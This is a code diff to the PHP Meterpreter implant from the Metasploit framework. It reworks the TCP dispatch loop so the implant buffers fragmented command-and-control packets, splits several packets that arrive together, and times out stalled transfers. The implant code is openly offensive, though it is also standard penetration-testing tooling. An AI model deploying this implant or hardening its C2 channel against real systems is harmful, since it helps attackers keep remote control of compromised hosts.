@@ -1,0 +1,95 @@
+diff --git a/php/meterpreter/meterpreter.php b/php/meterpreter/meterpreter.php
+index 7687142d..842910eb 100755
+--- a/php/meterpreter/meterpreter.php
++++ b/php/meterpreter/meterpreter.php
+@@ -1586,9 +1586,9 @@ function activate_transport_with_retry(&$transport) {
+ function dispatch_tcp(&$transport) {
+   $msgsock = $transport['_socket'];
+   add_reader($msgsock);
+-  $r = $GLOBALS['readers'];
+-  $w = null; $e = null; $t = 1;
+-  while (false !== ($cnt = select($r, $w, $e, $t))) {
++  $packet_buffer = '';
++  $packet_received_at = microtime(true);
++  while (true) {
+     if (empty($GLOBALS['running']) || time() > $GLOBALS['session_expiry_end']) {
+       remove_reader($msgsock); close($msgsock);
+       return DISPATCH_EXIT;
+@@ -1597,30 +1597,55 @@ function dispatch_tcp(&$transport) {
+       remove_reader($msgsock); close($msgsock);
+       return DISPATCH_SWITCH;
+     }
++    $r = $GLOBALS['readers'];
++    $w = null; $e = null; $t = 1;
++    $cnt = select($r, $w, $e, $t);
++    if ($cnt === false) {
++      break;
++    }
++    $packet_timeout = isset($transport['comm_timeout']) ? max(0, (float)$transport['comm_timeout']) : 300;
++    if ($packet_buffer !== '' && !in_array($msgsock, $r, true) &&
++        microtime(true) >= $packet_received_at + $packet_timeout) {
++      my_print("Communication timeout while receiving TCP packet");
++      remove_reader($msgsock); close($msgsock);
++      return DISPATCH_RETIRE;
++    }
+     for ($i = 0; $i < $cnt; $i++) {
+       $ready = $r[$i];
+       if ($ready == $msgsock) {
+-        $packet = read($msgsock, 32);
+-        if (false == $packet) {
++        $chunk = read($msgsock);
++        if ($chunk === false) {
+           remove_reader($msgsock); close($msgsock);
+           return DISPATCH_RETIRE;
+         }
+-        $xor = substr($packet, 0, 4);
+-        $header = xor_bytes($xor, substr($packet, 4, 28));
+-        $len_array = unpack("Nlen", substr($header, 20, 4));
+-        $len = $len_array['len'] + 32 - 8;
+-        while (strlen($packet) < $len) {
+-          $chunk = read($msgsock, $len - strlen($packet));
+-          if ($chunk === false || $chunk === '') {
+-            # The C2 socket closed mid-packet; the partial packet is
+-            # unprocessable so retire rather than attempt a corrupt response.
++        if ($chunk === '') {
++          continue;
++        }
++        $packet_buffer .= $chunk;
++        $packet_received_at = microtime(true);
++        # read() can return a fragment or several packets. Keep C2 framing
++        # here so an incomplete packet does not block channel activity, and
++        # leave the nonblocking channel-read contract unchanged.
++        while (strlen($packet_buffer) >= 32) {
++          $xor = substr($packet_buffer, 0, 4);
++          $header = xor_bytes($xor, substr($packet_buffer, 4, 28));
++          $len_array = unpack("Nlen", substr($header, 20, 4));
++          $len = $len_array['len'] + 32 - 8;
++          if ($len < 32) {
+             remove_reader($msgsock); close($msgsock);
+             return DISPATCH_RETIRE;
+           }
+-          $packet .= $chunk;
++          if (strlen($packet_buffer) < $len) {
++            break;
++          }
++          $packet = substr($packet_buffer, 0, $len);
++          $packet_buffer = substr($packet_buffer, $len);
++          $response = create_response(decrypt_packet(xor_bytes($xor, $packet)));
++          write_tlv_to_socket($msgsock, $response);
++          if (empty($GLOBALS['running']) || $GLOBALS['next_transport_idx'] !== null) {
++            break 2;
++          }
+         }
+-        $response = create_response(decrypt_packet(xor_bytes($xor, $packet)));
+-        write_tlv_to_socket($msgsock, $response);
+       } else {
+         #my_print("not Msgsock: $ready");
+         $chan_id = get_channel_id_from_resource($ready);
+@@ -1709,7 +1734,6 @@ function dispatch_tcp(&$transport) {
+         }
+       }
+     }
+-    $r = $GLOBALS['readers'];
+   }
+   remove_reader($msgsock); close($msgsock);
+   return DISPATCH_RETIRE;
